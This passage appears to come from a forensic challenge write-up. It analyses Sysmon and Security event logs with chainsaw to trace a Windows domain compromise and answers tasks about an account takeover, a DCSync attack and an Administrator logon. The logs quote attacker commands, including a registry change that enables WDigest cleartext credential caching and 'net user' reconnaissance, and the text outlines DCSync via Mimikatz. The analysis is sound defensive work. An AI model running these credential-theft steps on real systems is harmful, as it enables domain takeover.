    CommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --crash-handler --system "--database=C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\Crashpad" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7156.7 "--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log" --initial-client-data=0x250,0x254,0x258,0x22c,0x25c,0x7ff7b4b0c508,0x7ff7b4b0c514,0x7ff7b4b0c520'
    ParentCommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --system --windows-service --service=update-internal'
    CommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --crash-handler --system "--database=C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\Crashpad" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7156.7 "--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log" --initial-client-data=0x250,0x254,0x258,0x22c,0x25c,0x7ff7b4b0c508,0x7ff7b4b0c514,0x7ff7b4b0c520'
    ParentCommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --system --windows-service --service=update'
    CommandLine: '"C:\Windows\System32\SecurityHealthSystray.exe" '
    ParentCommandLine: C:\Windows\Explorer.EXE
    CommandLine: '"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr'
    ParentCommandLine: C:\Windows\Explorer.EXE
    CommandLine: '"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window --win-session-start'
    ParentCommandLine: C:\Windows\Explorer.EXE
    CommandLine: '"C:\Users\asmith\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background'
    ParentCommandLine: C:\Windows\Explorer.EXE
    CommandLine: '"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=crashpad-handler "--user-data-dir=C:\Users\asmith\AppData\Local\Microsoft\Edge\User Data" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler "--database=C:\Users\asmith\AppData\Local\Microsoft\Edge\User Data\Crashpad" "--metrics-dir=C:\Users\asmith\AppData\Local\Microsoft\Edge\User Data" --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=136.0.7103.113 "--annotation=exe=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --annotation=plat=Win64 --annotation=prod=Edge --annotation=ver=136.0.3240.76 --initial-client-data=0x244,0x248,0x24c,0x240,0x2e4,0x7ffb75547088,0x7ffb75547094,0x7ffb755470a0'
    ParentCommandLine: '"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window --win-session-start'
    CommandLine: C:\Windows\system32\sc.exe start pushtoinstall registration
    CommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --crash-handler --system "--database=C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\Crashpad" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7156.7 "--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log" --initial-client-data=0x250,0x254,0x258,0x22c,0x25c,0x7ff7b4b0c508,0x7ff7b4b0c514,0x7ff7b4b0c520'
    ParentCommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --wake --system'
    CommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --crash-handler --system "--database=C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\Crashpad" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7156.7 "--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log" --initial-client-data=0x250,0x254,0x258,0x22c,0x25c,0x7ff7b4b0c508,0x7ff7b4b0c514,0x7ff7b4b0c520'
    ParentCommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --system --windows-service --service=update-internal'
    CommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --crash-handler --system "--database=C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\Crashpad" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7156.7 "--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log" --initial-client-data=0x250,0x254,0x258,0x22c,0x25c,0x7ff7b4b0c508,0x7ff7b4b0c514,0x7ff7b4b0c520'
    ParentCommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --system --windows-service --service=update'
    CommandLine: '"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --single-argument microsoft-edge:https://news.microsoft.com/source/emea/features/a-new-copilot-tool-will-give-institut-curie-researchers-more-time-to-focus-on-cancer/?OCID=lock2'
    ParentCommandLine: sihost.exe
    CommandLine: '"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=crashpad-handler "--user-data-dir=C:\Users\asmith\AppData\Local\Microsoft\Edge\User Data" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler "--database=C:\Users\asmith\AppData\Local\Microsoft\Edge\User Data\Crashpad" "--metrics-dir=C:\Users\asmith\AppData\Local\Microsoft\Edge\User Data" --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=136.0.7103.113 "--annotation=exe=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --annotation=plat=Win64 --annotation=prod=Edge --annotation=ver=136.0.3240.76 --initial-client-data=0x244,0x248,0x24c,0x240,0x270,0x7ffb75547088,0x7ffb75547094,0x7ffb755470a0'
    ParentCommandLine: '"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window'
    CommandLine: C:\Windows\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations
    CommandLine: '"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /ua /installsource scheduler'
    CommandLine: '"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /ping PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48cmVxdWVzdCBwcm90b2NvbD0iMy4wIiB1cGRhdGVyPSJPbWFoYSIgdXBkYXRlcnZlcnNpb249IjEuMy4xOTUuNjEiIHNoZWxsX3ZlcnNpb249IjEuMy4xNDcuMzciIGlzbWFjaGluZT0iMSIgc2Vzc2lvbmlkPSJ7Njc0RjQ1RTYtMjI0QS00MzYwLTgyMjEtNTE0M0ZBQ0YyRTI1fSIgdXNlcmlkPSJ7NTg0NjdFMzctQzFERS00MzE4LUI5QzItM0E1QkNDOTEyN0I1fSIgaW5zdGFsbHNvdXJjZT0ic2NoZWR1bGVyIiByZXF1ZXN0aWQ9IntBMUQ3QUFCNy0zM0MxLTRCRUUtQkFGNS0xMENFQUFCQTU2NDJ9IiBkZWR1cD0iY3IiIGRvbWFpbmpvaW5lZD0iMSI-PGh3IGxvZ2ljYWxfY3B1cz0iMiIgcGh5c21lbW9yeT0iMyIgZGlza190eXBlPSIyIiBzc2U9IjEiIHNzZTI9IjEiIHNzZTM9IjEiIHNzc2UzPSIxIiBzc2U0MT0iMSIgc3NlNDI9IjEiIGF2eD0iMSIvPjxvcyBwbGF0Zm9ybT0id2luIiB2ZXJzaW9uPSIxMC4wLjE5MDQ1LjIwMDYiIHNwPSIiIGFyY2g9Ing2NCIgcHJvZHVjdF90eXBlPSI3MiIgaXNfd2lwPSIwIiBpc19pbl9sb2NrZG93bl9tb2RlPSIwIi8-PG9lbSBwcm9kdWN0X21hbnVmYWN0dXJlcj0iVk13YXJlLCBJbmMuIiBwcm9kdWN0X25hbWU9IlZNd2FyZSBWaXJ0dWFsIFBsYXRmb3JtIi8-PGV4cCBldGFnPSImcXVvdDtyNDUydDErazJUZ3EvSFh6anZGTkJSaG9wQldSOXNialh4cWVVREg5dVgwPSZxdW90OyIvPjxhcHAgYXBwaWQ9IntGM0M0RkUwMC1FRkQ1LTQwM0ItOTU2OS0zOThBMjBGMUJBNEF9IiB2ZXJzaW9uPSIxLjMuMTk1LjYxIiBuZXh0dmVyc2lvbj0iIiBsYW5nPSIiIGJyYW5kPSJJTkJYIiBjbGllbnQ9IiIgaW5zdGFsbGFnZT0iNSIgY29ob3J0PSJycmZAMC4yOSI-PHVwZGF0ZWNoZWNrLz48cGluZyByPSIxIiByZD0iNjcxOCIgcGluZ19mcmVzaG5lc3M9IntERUZGNDQ3MC02REZFLTRFQjYtQTk2My0zOTZENUE3NUREQkV9Ii8-PC9hcHA-PGFwcCBhcHBpZD0iezU2RUIxOEY4LUIwMDgtNENCRC1CNkQyLThDOTdGRTdFOTA2Mn0iIHZlcnNpb249IjEzNi4wLjMyNDAuNzYiIG5leHR2ZXJzaW9uPSIiIGxhbmc9IiIgYnJhbmQ9IklOQlgiIGNsaWVudD0iIiBpbnN0YWxsYWdlPSI1IiBjb2hvcnQ9InJyZkAwLjg4IiBvb2JlX2luc3RhbGxfdGltZT0iMTMzOTIwOTYzOTcxOTIxNDAwIiB1cGRhdGVfY291bnQ9IjEiIGlzX3Bpbm5lZF9zeXN0ZW09InRydWUiIGxhc3RfbGF1bmNoX2NvdW50PSIxIiBsYXN0X2xhdW5jaF90aW1lPSIxMzM5MjYxNjAzODk1ODgyNjAiIGZpcnN0X2ZyZV9zZWVuX3RpbWU9IjEzMzkyNTkyMTg3NDc3NTA5MCIgZmlyc3RfZnJlX3NlZW5fdmVyc2lvbj0iMTM2LjAuMzI0MC43NiI-PHVwZGF0ZWNoZWNrLz48cGluZyBhY3RpdmU9IjEiIGE9IjEiIHI9IjEiIGFkPSI2NzE4IiByZD0iNjcxOCIgcGluZ19mcmVzaG5lc3M9InszQkYyNzMwNi02M0RCLTQwNDYtOTVGMy01NUI4OUQ4Mjk4QTF9Ii8-PC9hcHA-PGFwcCBhcHBpZD0ie0YzMDE3MjI2LUZFMkEtNDI5NS04QkRGLTAwQzNBOUE3RTRDNX0iIHZlcnNpb249IjEzNi4wLjMyNDAuNzYiIG5leHR2ZXJzaW9uPSIxMzYuMC4zMjQwLjkyIiBsYW5nPSIiIGJyYW5kPSJFVVdWIiBjbGllbnQ9IiIgaW5zdGFsbGFnZT0iNiIgaW5zdGFsbGRhdGU9IjY3MTMiIGNvaG9ydD0icnJmQDAuNDMiPjx1cGRhdGVjaGVjay8-PGV2ZW50IGV2ZW50dHlwZT0iMTIiIGV2ZW50cmVzdWx0PSIxIiBlcnJvcmNvZGU9IjAiIGV4dHJhY29kZTE9IjAiIHN5c3RlbV91cHRpbWVfdGlja3M9IjM4OTUwMjEyNjIyIiBkb25lX2JlZm9yZV9vb2JlX2NvbXBsZXRlPSIwIi8-PGV2ZW50IGV2ZW50dHlwZT0iMTMiIGV2ZW50cmVzdWx0PSIxIiBlcnJvcmNvZGU9IjAiIGV4dHJhY29kZTE9IjAiIHN5c3RlbV91cHRpbWVfdGlja3M9IjM4OTUwMzczOTU0IiBkb25lX2JlZm9yZV9vb2JlX2NvbXBsZXRlPSIwIi8-PGV2ZW50IGV2ZW50dHlwZT0iMTQiIGV2ZW50cmVzdWx0PSIxIiBlcnJvcmNvZGU9IjAiIGV4dHJhY29kZTE9IjAiIHN5c3RlbV91cHRpbWVfdGlja3M9IjM5MDQ5MTIxMDMyIiBzb3VyY2VfdXJsX2luZGV4PSIwIiBkb25lX2JlZm9yZV9vb2JlX2NvbXBsZXRlPSIwIiBkb3dubG9hZGVyPSJkbyIgdXJsPSJodHRwOi8vbXNlZGdlLmIudGx1LmRsLmRlbGl2ZXJ5Lm1wLm1pY3Jvc29mdC5jb20vZmlsZXN0cmVhbWluZ3NlcnZpY2UvZmlsZXMvMjdkMDIwYjAtMWRlOS00OWExLThlZTktZGUwNGMwOTlmM2I5P1AxPTE3NDg3NDkxNzcmYW1wO1AyPTQwNCZhbXA7UDM9MiZhbXA7UDQ9TkpNcTNCWVRDSUdaS25SSUw1RlZzbFBPYmVrS0dDWWFveE9sR0JBRUdVWWZWajhpYUJ5aXFIZmRaQzZLWWZpS3h0UnVGVXJCbThERVdhWTI2clZOWkElM2QlM2QiIHNlcnZlcl9pcF9oaW50PSIiIGNkbl9jaWQ9Ii0xIiBjZG5fY2NjPSIiIGNkbl9tc2VkZ2VfcmVmPSIiIGNkbl9henVyZV9yZWZfb3JpZ2luX3NoaWVsZD0iIiBjZG5fY2FjaGU9IiIgY2RuX3AzcD0iIiBkb3dubG9hZGVkPSIxMDgzOTA5NiIgdG90YWw9IjEwODM5MDk2IiBkb3dubG9hZF90aW1lX21zPSI5Mjk3Ii8-PGV2ZW50IGV2ZW50dHlwZT0iMTQiIGV2ZW50cmVzdWx0PSIxIiBlcnJvcmNvZGU9IjAiIGV4dHJhY29kZTE9IjAiIHN5c3RlbV91cHRpbWVfdGlja3M9IjM5MDUwOTk3NTY1IiBzb3VyY2VfdXJsX2luZGV4PSIwIiBkb25lX2JlZm9yZV9vb2JlX2NvbXBsZXRlPSIwIi8-PGV2ZW50IGV2ZW50dHlwZT0iMTUiIGV2ZW50cmVzdWx0PSIxIiBlcnJvcmNvZGU9IjAiIGV4dHJhY29kZTE9IjAiIHN5c3RlbV91cHRpbWVfdGlja3M9IjM5MDU3NzE0NDU0IiBkb25lX2JlZm9yZV9vb2JlX2NvbXBsZXRlPSIwIi8-PGV2ZW50IGV2ZW50dHlwZT0iMyIgZXZlbnRyZXN1bHQ9IjEiIGVycm9yY29kZT0iMCIgZXh0cmFjb2RlMT0iMTk2NzU3IiBzeXN0ZW1fdXB0aW1lX3RpY2tzPSIzOTYzOTExOTA0MyIgc291cmNlX3VybF9pbmRleD0iMCIgZG9uZV9iZWZvcmVfb29iZV9jb21wbGV0ZT0iMCIgdXBkYXRlX2NoZWNrX3RpbWVfbXM9IjEzMTIiIGRvd25sb2FkX3RpbWVfbXM9IjEwMDMxIiBkb3dubG9hZGVkPSIxMDgzOTA5NiIgdG90YWw9IjEwODM5MDk2IiBwYWNrYWdlX2NhY2hlX3Jlc3VsdD0iMCIgaW5zdGFsbF90aW1lX21zPSI1ODEwOSIvPjxwaW5nIHI9IjEiIHJkPSI2NzE4IiBwaW5nX2ZyZXNobmVzcz0iezM0ODczNzI0LTMwNzctNEFGQy04NTYyLUVBN0U3OTg0MDMzQn0iLz48L2FwcD48L3JlcXVlc3Q-'
    ParentCommandLine: '"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc'
    CommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --crash-handler --system "--database=C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\Crashpad" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7156.7 "--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log" --initial-client-data=0x250,0x254,0x258,0x22c,0x25c,0x7ff7f767c508,0x7ff7f767c514,0x7ff7f767c520'
    ParentCommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --wake --system'
    CommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --crash-handler --system "--database=C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\Crashpad" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7156.7 "--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log" --initial-client-data=0x250,0x254,0x258,0x230,0x25c,0x7ff7f767c508,0x7ff7f767c514,0x7ff7f767c520'
    ParentCommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --system --windows-service --service=update-internal'
    CommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --crash-handler --system "--database=C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\Crashpad" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7156.7 "--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log" --initial-client-data=0x26c,0x270,0x274,0x248,0x278,0x7ff7f767c508,0x7ff7f767c514,0x7ff7f767c520'
    ParentCommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --system --windows-service --service=update'
    CommandLine: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" '
    ParentCommandLine: C:\Windows\Explorer.EXE
    CommandLine: cmd.exe
    ParentCommandLine: C:\Windows\VgYTbFEK.exe
    CommandLine: whoami
    ParentCommandLine: cmd.exe
    CommandLine: net  user
    ParentCommandLine: cmd.exe
    CommandLine: C:\Windows\system32\net1  user
    ParentCommandLine: net  user
    CommandLine: C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding
    CommandLine: powershell
    ParentCommandLine: cmd.exe
    CommandLine: '"C:\Users\jody\Downloads\netdiag.exe"'
    ParentCommandLine: powershell
    CommandLine: '"C:\Windows\system32\runas.exe" /user:Main\lucas cmd'
    ParentCommandLine: powershell
    CommandLine: '"C:\Users\jody\Downloads\netdiag.exe"'
    ParentCommandLine: powershell
    CommandLine: '"C:\Windows\system32\reg.exe" add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1'
    ParentCommandLine: powershell
    CommandLine: cmd.exe
    ParentCommandLine: C:\Windows\VgYTbFEK.exe
    CommandLine: reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
    ParentCommandLine: cmd.exe
    CommandLine: cmd.exe
    ParentCommandLine: C:\Windows\olIUYvbK.exe
    CommandLine: powershell
    ParentCommandLine: cmd.exe
    CommandLine: cmd.exe
    ParentCommandLine: C:\Windows\VgYTbFEK.exe
    CommandLine: powershell
    ParentCommandLine: cmd.exe
    CommandLine: '"C:\Users\sqlsvc\Downloads\netdiag.exe"'
    ParentCommandLine: powershell
    CommandLine: '"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /ua /installsource scheduler'
    CommandLine: '"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --single-argument microsoft-edge:https://news.microsoft.com/source/emea/features/a-new-copilot-tool-will-give-institut-curie-researchers-more-time-to-focus-on-cancer/?OCID=lock2'
    ParentCommandLine: sihost.exe
    CommandLine: '"C:\Windows\system32\verclsid.exe" /S /C {9E175B8B-F52A-11D8-B9A5-505054503030} /I {0C733A8A-2A1C-11CE-ADE5-00AA0044773D} /X 0x401'
    ParentCommandLine: C:\Windows\System32\RuntimeBroker.exe -Embedding
    CommandLine: '"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=crashpad-handler "--user-data-dir=C:\Users\asmith\AppData\Local\Microsoft\Edge\User Data" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler "--database=C:\Users\asmith\AppData\Local\Microsoft\Edge\User Data\Crashpad" "--metrics-dir=C:\Users\asmith\AppData\Local\Microsoft\Edge\User Data" --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=136.0.7103.113 "--annotation=exe=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --annotation=plat=Win64 --annotation=prod=Edge --annotation=ver=136.0.3240.76 --initial-client-data=0x244,0x248,0x24c,0x240,0x254,0x7ffb75547088,0x7ffb75547094,0x7ffb755470a0'
    ParentCommandLine: '"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window'
[+] Done
    CommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --crash-handler --system "--database=C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\Crashpad" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7156.7 "--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log" --initial-client-data=0x250,0x254,0x258,0x22c,0x25c,0x7ff63a20c508,0x7ff63a20c514,0x7ff63a20c520'
    ParentCommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --wake --system'
    CommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --crash-handler --system "--database=C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\Crashpad" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7156.7 "--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log" --initial-client-data=0x250,0x254,0x258,0x22c,0x25c,0x7ff63a20c508,0x7ff63a20c514,0x7ff63a20c520'
    ParentCommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --system --windows-service --service=update-internal'
    CommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --crash-handler --system "--database=C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\Crashpad" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7156.7 "--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log" --initial-client-data=0x250,0x254,0x258,0x22c,0x25c,0x7ff63a20c508,0x7ff63a20c514,0x7ff63a20c520'
    ParentCommandLine: '"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.7\updater.exe" --system --windows-service --service=update'
```

If we look closely, we can add another grep and get the exact username:
```
❯ chainsaw dump Sysmon.evtx | grep -i "CommandLine:" | grep -ivE "svchost|taskhost|conhost" | grep "user:"

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By WithSecure Countercept (@FranticTyping, @AlexKornitzer)

[+] Dumping the contents of forensic artefacts from: Sysmon.evtx (extensions: *)
[+] Loaded 1 forensic artefacts (8.1 MiB)
    CommandLine: '"C:\Windows\system32\runas.exe" /user:Main\lucas cmd'
[+] Done
```

##### Answer: `lucas`

## TASK 12
After obtaining the cleartext password of this account, the attacker carried out a domain-level credential extraction attack. At what time did the compromised account perform this attack on the domain? (UTC)

```
❯ chainsaw dump Security.evtx | grep -i "lucas" -B 10 -A 20 | grep -E "4662|SystemTime"

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By WithSecure Countercept (@FranticTyping, @AlexKornitzer)

[+] Dumping the contents of forensic artefacts from: Security.evtx (extensions: *)
[+] Loaded 1 forensic artefacts (3.1 MiB)
      SystemTime: 2025-05-25T04:24:48.055601Z
      SystemTime: 2025-05-25T04:24:48.073148Z
      SystemTime: 2025-05-25T04:24:48.092079Z
      SystemTime: 2025-05-25T04:25:08.110948Z
      SystemTime: 2025-05-25T04:26:36.199176Z
      SystemTime: 2025-05-25T04:26:36.414717Z
[+] Done
      SystemTime: 2025-05-25T04:26:37.149220Z
      SystemTime: 2025-05-25T04:27:22.584194Z
```

When an attacker runs a DCSync (for example, using `lsadump::dcsync` in Mimikatz), the typical technical output in the DC logs looks like this:
- **Reconnaissance (04:24:48):** The attacker queries the domain object to check permissions or look up the target user's GUID. These are `Event 4662` entries but with common “read” access masks.
- **The Attack (04:26:36):** This is where the replication of secret data is requested. We can see that at this exact moment there are two events taking place almost simultaneously, This is because a full DCSync requires two specific replication rights that are validated one after the other: “Replicating Directory Changes” and “Replicating Directory Changes All.”

##### Answer: `2025-05-25 04:26:36`

## Task 13
At what time did the attacker initially authenticate using the administrator account? (UTC)

Following the DCSync attack carried out at 04:26:36, the attacker now has the Administrator account hash in their possession. The next logical step in their attack chain is to use that hash (a “pass-the-hash” technique) or the password (if he managed to crack it) to gain full control of the system.

We are looking for a successful logon event `Event ID 4624` where the user is an `Administrator`.

```
❯ chainsaw dump Security.evtx | grep -B 15 -A 10 -i "TargetUserName: Administrator" | grep -E "EventID: 4624|SystemTime|LogonType|TargetUserName"

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By WithSecure Countercept (@FranticTyping, @AlexKornitzer)

[+] Dumping the contents of forensic artefacts from: Security.evtx (extensions: *)
[+] Loaded 1 forensic artefacts (3.1 MiB)
      SystemTime: 2025-05-25T02:38:47.460752Z
    TargetUserName: Administrator
      SystemTime: 2025-05-25T02:40:10.355540Z
    TargetUserName: Administrators
      SystemTime: 2025-05-25T02:40:13.775755Z
    TargetUserName: Administrators
      SystemTime: 2025-05-25T02:40:14.559919Z
    TargetUserName: Administrators
      SystemTime: 2025-05-25T02:40:15.165228Z
    TargetUserName: Administrators
      SystemTime: 2025-05-25T02:40:17.661022Z
    TargetUserName: Administrators
      SystemTime: 2025-05-25T02:40:18.546976Z
    TargetUserName: Administrators
      SystemTime: 2025-05-25T02:40:29.234714Z
    TargetUserName: Administrators
      SystemTime: 2025-05-25T02:40:29.265160Z
    TargetUserName: Administrators
      SystemTime: 2025-05-25T02:40:29.290088Z
    TargetUserName: Administrators
      SystemTime: 2025-05-25T02:40:29.314248Z
    TargetUserName: Administrators
      SystemTime: 2025-05-25T02:40:39.537144Z
    TargetUserName: Administrators
      SystemTime: 2025-05-25T02:40:48.860800Z
    TargetUserName: Administrators
      SystemTime: 2025-05-25T02:41:19.097364Z
    TargetUserName: Administrator
      SystemTime: 2025-05-25T02:41:19.099826Z
    TargetUserName: Administrator@MAIN.LOCAL
      SystemTime: 2025-05-25T02:41:19.123222Z
    TargetUserName: Administrator
      SystemTime: 2025-05-25T02:41:19.123385Z
    TargetUserName: Administrator
    LogonType: 2
      SystemTime: 2025-05-25T02:41:22.318491Z
    TargetUserName: Administrators
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
      SystemTime: 2025-05-25T02:52:01.631008Z
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
      SystemTime: 2025-05-25T03:19:24.004729Z
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    LogonType: 7
      SystemTime: 2025-05-25T03:19:24.105529Z
    TargetUserName: Administrator
    LogonType: 7
      SystemTime: 2025-05-25T03:19:24.105811Z
    TargetUserName: Administrator
      SystemTime: 2025-05-25T03:19:24.118207Z
    TargetUserName: Administrator
      SystemTime: 2025-05-25T03:19:24.121008Z
    TargetUserName: Administrator@MAIN.LOCAL
      SystemTime: 2025-05-25T03:19:24.221681Z
    TargetUserName: Administrator
      SystemTime: 2025-05-25T03:19:24.221714Z
    TargetUserName: Administrator
    LogonType: 7
      SystemTime: 2025-05-25T03:19:24.223366Z
    TargetUserName: Administrator
    LogonType: 7
    TargetUserName: Administrator
      SystemTime: 2025-05-25T03:36:37.827945Z
    TargetUserName: Administrator
    TargetUserName: Administrator
      SystemTime: 2025-05-25T03:40:27.588003Z
    TargetUserName: Administrator
    TargetUserName: Administrator
    TargetUserName: Administrator
    LogonType: 7
      SystemTime: 2025-05-25T03:40:27.683668Z
    TargetUserName: Administrator
      SystemTime: 2025-05-25T03:40:27.687700Z
    TargetUserName: Administrator
    LogonType: 7
      SystemTime: 2025-05-25T03:40:27.695156Z
    TargetUserName: Administrator
      SystemTime: 2025-05-25T03:40:27.696883Z
    TargetUserName: Administrator@MAIN.LOCAL
    TargetUserName: Administrator
      SystemTime: 2025-05-25T03:40:27.745375Z
    TargetUserName: Administrator
      SystemTime: 2025-05-25T03:40:27.745434Z
    TargetUserName: Administrator
    LogonType: 7
      SystemTime: 2025-05-25T03:40:27.755188Z
